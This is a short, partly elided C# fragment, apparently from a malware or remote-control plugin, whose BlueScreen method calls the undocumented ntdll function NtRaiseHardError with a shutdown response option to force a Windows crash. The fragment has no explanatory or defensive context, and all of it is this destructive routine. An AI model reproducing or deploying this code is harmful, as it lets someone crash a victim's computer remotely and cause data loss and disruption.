...
namespace Plugin
{
    public class Main
    {
        ...
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption);
        ...
        public void BlueScreen()
        {
            ...
            NtRaiseHardError(0xC0140002, 0, 0, IntPtr.Zero, 6);
        }
